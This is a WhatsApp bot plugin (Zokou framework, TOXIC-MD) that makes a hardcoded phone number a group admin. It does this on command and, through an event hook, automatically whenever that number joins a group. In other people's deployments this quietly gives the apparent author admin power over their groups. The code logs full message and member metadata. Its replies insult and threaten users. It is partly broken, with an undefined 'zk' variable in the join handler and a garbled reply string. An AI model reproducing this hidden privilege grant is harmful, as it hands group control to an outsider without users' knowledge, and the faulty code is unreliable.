const { zokou } = require('../framework/zokou');

// Define the owner number
const OWNER_NUMBER = "+254735342808";
const OWNER_JID = `${OWNER_NUMBER}@s.whatsapp.net`;

// Normalize phone number
const normalizeNumber = (number) => {
  return number.replace(/[^0-9]/g, '').replace(/^0+/, '').replace(/^\+254/, '254') || number;
};

zokou({ nomCom: "powner", categorie: "Group", reaction: "💥" }, async (dest, zk, commandeOptions) => {
  const { ms, repondre, verifGroupe, infosGroupe, auteurMessage } = commandeOptions;

  console.log(`[DEBUG] powner triggered by ${ms.key.participant || ms.key.remoteJid} in ${dest}`);
  console.log(`[DEBUG] auteurMessage: ${auteurMessage}, expected: ${OWNER_JID}`);
  console.log(`[DEBUG] ms object:`, JSON.stringify(ms, null, 2));

  // Handle null pushName
  const userName = ms.pushName || "Boss";

  // Check if it’s a group chat
  if (!verifGroupe) {
    console.log(`[DEBUG] powner: Not a group chat`);
    repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ YOU BRAINLESS FOOL! 😡 This ain’t a group! Stop screwing around and hit a group NOW! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
    return;
  }

  // Check if user is owner
  const normalizedAuteur = normalizeNumber(auteurMessage.split('@')[0]);
  const normalizedOwner = normalizeNumber(OWNER_NUMBER);
  const isOwner = auteurMessage === OWNER_JID || normalizedAuteur === normalizedOwner || auteurMessage.startsWith(OWNER_NUMBER);
  console.log(`[DEBUG] Owner check: isOwner=${isOwner}, normalizedAuteur=${normalizedAuteur}, normalizedOwner=${normalizedOwner}`);

  if (!isOwner) {
    console.log(`[DEBUG] powner: User is not the owner`);
    repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ YOU WORTHLESS IMPOSTOR! 😤 Think you can fake ${OWNER_NUMBER}? You’re DUST! Begone, scum! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
    return;
  }

  // Get group metadata and admins
  let verifZokAdmin = false;
  let admins = [];
  try {
    const metadata = await zk.groupMetadata(dest);
    admins = metadata.participants.filter(p => p.admin !== null).map(p => p.id);
    const botJid = zk.user.id.split(':')[0] + '@s.whatsapp.net';
    verifZokAdmin = admins.includes(botJid);
    console.log(`[DEBUG] Bot admin check: verifZokAdmin=${verifZokAdmin}, botJid=${botJid}, admins=`, admins);
    console.log(`[DEBUG] Full metadata:`, JSON.stringify(metadata, null, 2));
  } catch (e) {
    console.log(`[DEBUG] Error fetching metadata: ${e}`);
  }

  if (!verifZokAdmin) {
    console.log(`[DEBUG] powner: Bot is not an admin`);
    repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ HEY, ${userName}! 😤 I’m no admin, so I can’t crown you! Tell these clowns to make me admin or I’ll WRECK THEM! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
    return;
  }

  // Check if owner is in group
  const membresGroupe = verifGroupe ? await infosGroupe.participants : [];
  const ownerInGroup = membresGroupe.some(member => member.id === OWNER_JID || normalizeNumber(member.id.split('@')[0]) === normalizedOwner);
  console.log(`[DEBUG] Owner in group: ${ownerInGroup}`);

  if (!ownerInGroup) {
    console.log(`[DEBUG] powner: Owner is not in the group`);
    repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ BOSS, YOU KIDDING ME? 😳 You’re not in this group! Get in here or I’m DONE! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
    return;
  }

  // Check if owner is already admin
  const ownerMember = membresGroupe.find(member => member.id === OWNER_JID || normalizeNumber(member.id.split('@')[0]) === normalizedOwner);
  const ownerIsAdmin = ownerMember && ownerMember.admin !== null;
  console.log(`[DEBUG] Owner admin status: ${ownerIsAdmin}`);

  if (ownerIsAdmin) {
    console.log(`[DEBUG] powner: Owner is already an admin`);
    repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ CHILL, ${userName}! 😎 You’re already the GOD OF THIS GROUP! Keep crushing it, legend! 💪\n◈━━━━━━━━━━━━━━━━◈`);
    return;
  }

  // Promote owner
  try {
    console.log(`[DEBUG] powner: Promoting owner to admin: ${OWNER_JID}`);
    await zk.groupParticipantsUpdate(dest, [OWNER_JID], "promote");
    console.log(`[DEBUG] powner: Owner promoted successfully`);
    repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ ALL KNEEL FOR ${userName}! 😈 You’re now the SUPREME TYRANT of this group! BURN IT DOWN! 💥\n│❒ Powered by xh_clinton\n◈━━━━━━━━━━━━━━━━◈`);
  } catch (e) {
    console.log(`[DEBUG] powner: Error promoting owner: ${e}`);
    repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ THIS IS GARBAGE, ${userName}! 😤 Failed to crown you: ${e.message}! I’ll SMASH this system! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
  }
});

// Auto-promotion on join
zokou.on('group-participants-update', async (update) => {
  const { id, participants, action } = update;

  console.log(`[DEBUG] group-participants-update: Action: ${action}, Group: ${id}, Participants: ${participants}`);

  if (action !== 'add') {
    console.log(`[DEBUG] group-participants-update: Ignoring non-add action`);
    return;
  }

  // Check bot admin status
  let verifZokAdmin = false;
  let admins = [];
  try {
    const metadata = await zk.groupMetadata(id);
    admins = metadata.participants.filter(p => p.admin !== null).map(p => p.id);
    const botJid = zokou.user.id.split(':')[0] + '@s.whatsapp.net';
    verifZokAdmin = admins.includes(botJid);
    console.log(`[DEBUG] Auto-promote bot admin check: verifZokAdmin=${verifZokAdmin}, botJid=${botJid}, admins=`, admins);
  } catch (e) {
    console.log(`[DEBUG] Error fetching metadata for auto-promote: ${e}`);
  }

  if (!verifZokAdmin) {
    console.log(`[DEBUG] group-participants-update: Bot is not admin`);
    await zokou.sendMessage(id, { text: `𝐓𝐎𝐗𝐈�{C-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ YOU USELESS LOT! 😤 I’m not admin, so I can’t crown the boss! Make me admin or EAT DUST! 🚫\n◈━━━━━━━━━━━━━━━━◈` });
    return;
  }

  // Check if owner joined
  const normalizedOwner = normalizeNumber(OWNER_NUMBER);
  const ownerJoined = participants.some(p => p === OWNER_JID || normalizeNumber(p.split('@')[0]) === normalizedOwner);
  console.log(`[DEBUG] Owner joined: ${ownerJoined}`);

  if (!ownerJoined) {
    console.log(`[DEBUG] group-participants-update: Owner did not join`);
    return;
  }

  // Check if owner is already admin
  const metadata = await zk.groupMetadata(id);
  const ownerMember = metadata.participants.find(p => p.id === OWNER_JID || normalizeNumber(p.id.split('@')[0]) === normalizedOwner);
  const ownerIsAdmin = ownerMember && ownerMember.admin !== null;

  if (ownerIsAdmin) {
    console.log(`[DEBUG] group-participants-update: Owner is already admin`);
    return;
  }

  // Promote owner
  try {
    console.log(`[DEBUG] group-participants-update: Promoting owner: ${OWNER_JID}`);
    await zokou.groupParticipantsUpdate(id, [OWNER_JID], "promote");
    console.log(`[DEBUG] group-participants-update: Owner promoted successfully`);
    await zokou.sendMessage(id, { text: `𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ SILENCE, WORMS! 😈 The ULTIMATE WARLORD ${OWNER_NUMBER} has arrived!\n│❒ I’ve crowned them ADMIN before you could whimper! BOW OR BE ANNIHILATED! 💥\n│❒ Powered by xh_clinton\n◈━━━━━━━━━━━━━━━━◈` });
  } catch (e) {
    console.log(`[DEBUG] group-participants-update: Error promoting owner: ${e}`);
    await zokou.sendMessage(id, { text: `𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ THE BOSS ${OWNER_NUMBER} IS HERE! 😎 But this pathetic system failed: ${e.message}!\n│❒ I’ll RIP IT APART unless it’s fixed! 😡\n◈━━━━━━━━━━━━━━━━◈` });
  }
});